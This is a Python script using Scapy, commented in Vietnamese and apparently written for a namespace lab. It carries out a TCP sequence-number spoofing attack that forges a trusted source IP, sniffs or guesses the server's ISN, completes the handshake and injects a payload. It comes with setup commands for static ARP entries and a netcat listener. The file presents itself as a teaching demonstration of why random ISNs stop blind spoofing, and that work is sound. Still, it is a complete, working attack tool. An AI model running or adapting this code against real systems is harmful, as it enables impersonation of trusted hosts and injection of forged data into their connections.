#!/usr/bin/env python3
# spoof_sniff.py - Minh hoa tan cong GIA MAO TCP dua tren so thu tu (ISN).
#
# Ke tan cong gia lam 1 "host tin cay" (--spoof-src, vd 10.0.0.9) de bat tay
# 3 buoc TCP voi victim, roi CHEN du lieu. Diem mau chot la ke tan cong phai
# biet ISN ma server chon trong SYN-ACK:
#
#   --mode sniff : ke tan cong DUNG DUONG (on-path) -> DOC duoc ISN tu SYN-ACK
#                  bang cach bat goi -> bat tay THANH CONG. (Cho thay vi sao ISN
#                  phai duoc giu bi mat.)
#   --mode blind : ke tan cong NGOAI DUONG (off-path) -> KHONG thay SYN-ACK, phai
#                  DOAN ISN (--guess). Voi kernel RFC 6528, doan sai -> bat tay
#                  THAT BAI. (Chung minh ISN ngau nhien chong duoc spoofing mu.)
#
# CHUAN BI (1 lan, chay o root netns) de victim gui SYN-ACK cua IP gia toi dung
# card cua attacker tren lien ket:
#   H1MAC=$(ip netns exec h1 cat /sys/class/net/veth1/address)
#   ip netns exec h2 ip neigh replace 10.0.0.9 lladdr $H1MAC dev veth2
# Va chan kernel attacker gui RST ho (neu dung IP that cua minh):
#   (khong can khi spoof-src la 10.0.0.9 vi IP nay khong thuoc attacker)
#
# Tren victim, mo 1 dich vu lang nghe de thay du lieu chen vao, vd:
#   ip netns exec h2 nc -lk -p 8080
#
# LAB-ONLY - chi chay trong namespace co lap.
# Chay (can root):
#   sudo ip netns exec h1 python3 spoof_sniff.py --mode sniff
#   sudo ip netns exec h1 python3 spoof_sniff.py --mode blind --guess 0
#
import argparse
import random
from scapy.all import IP, TCP, send, AsyncSniffer, conf

conf.verb = 0


def do_attack(iface, dst, dport, spoof_src, mode, guess, payload, timeout):
    sport = random.randint(1024, 65535)
    client_isn = random.randint(0, 0xFFFFFFFF)

    sniffer = None
    if mode == "sniff":
        # Bat SYN-ACK tu server gui ve dia chi gia mao
        bpf = f"tcp and src host {dst} and src port {dport} and dst host {spoof_src}"
        sniffer = AsyncSniffer(iface=iface, filter=bpf, count=1, store=True)
        sniffer.start()

    # Buoc 1: gui SYN gia mao nguon = spoof_src
    syn = IP(src=spoof_src, dst=dst) / TCP(sport=sport, dport=dport,
                                           flags="S", seq=client_isn)
    send(syn)
    print(f"[>] SYN  src={spoof_src}:{sport} -> {dst}:{dport}  seq={client_isn}")

    server_isn = None
    if mode == "sniff":
        sniffer.join(timeout=timeout)
        pkts = sniffer.results
        if pkts:
            sa = pkts[0]
            server_isn = sa[TCP].seq
            print(f"[<] BAT DUOC SYN-ACK: server_isn = {server_isn} "
                  f"(0x{server_isn:08x})  [doc truc tiep tu goi]")
        else:
            print("[x] Khong bat duoc SYN-ACK. Kiem tra ARP tinh cho spoof-src "
                  "va dich vu lang nghe tren victim.")
            return
    else:  # blind
        server_isn = guess
        print(f"[?] Che do MU: DOAN server_isn = {server_isn} "
              f"(khong nhin thay SYN-ACK)")

    # Buoc 3: gui ACK hoan tat bat tay (ack = server_isn + 1)
    ack = IP(src=spoof_src, dst=dst) / TCP(sport=sport, dport=dport, flags="A",
                                           seq=client_isn + 1, ack=server_isn + 1)
    send(ack)
    print(f"[>] ACK  seq={client_isn + 1}  ack={server_isn + 1}")

    # Chen du lieu nhu la host tin cay
    data = IP(src=spoof_src, dst=dst) / TCP(sport=sport, dport=dport,
                                            flags="PA", seq=client_isn + 1,
                                            ack=server_isn + 1) / payload
    send(data)
    print(f"[>] PSH/ACK  chen payload: {payload!r}")

    print()
    if mode == "sniff":
        print("[KET QUA] On-path: doc duoc ISN -> bat tay & chen du lieu THANH CONG.")
        print("          => ISN ngau nhien KHONG cuu duoc khi ke tan cong dung tren duong.")
        print("          Kiem tra terminal `nc -lk` cua victim: payload da xuat hien.")
    else:
        print("[KET QUA] Off-path (mu): neu server_isn thuc != gia tri doan, ACK bi")
        print("          victim coi la khong hop le (sai so thu tu) -> bat tay THAT BAI,")
        print("          payload KHONG duoc chap nhan. Voi ISN ngau nhien 32-bit, xac")
        print("          suat doan trung ~ 1/2^32 -> tan cong mu BAT KHA THI tren he hien dai.")


def main():
    ap = argparse.ArgumentParser(description="TCP spoofing dua tren ISN (lab-only)")
    ap.add_argument("--iface", default="veth1", help="Card de bat goi (trong h1)")
    ap.add_argument("--dst", default="10.0.0.2", help="IP victim/server")
    ap.add_argument("--dport", type=int, default=8080, help="Cong dich vu victim")
    ap.add_argument("--spoof-src", default="10.0.0.9",
                    help="IP host tin cay bi gia mao (khong thuoc attacker)")
    ap.add_argument("--mode", choices=["sniff", "blind"], default="sniff",
                    help="sniff = on-path doc ISN; blind = off-path doan ISN")
    ap.add_argument("--guess", type=int, default=0,
                    help="Gia tri ISN doan (che do blind)")
    ap.add_argument("--payload", default="hijacked-by-spoofed-host\n",
                    help="Du lieu chen sau bat tay")
    ap.add_argument("--timeout", type=float, default=3.0, help="Timeout cho sniff")
    args = ap.parse_args()

    do_attack(args.iface, args.dst, args.dport, args.spoof_src, args.mode,
              args.guess, args.payload.encode() if isinstance(args.payload, str)
              else args.payload, args.timeout)


if __name__ == "__main__":
    main()
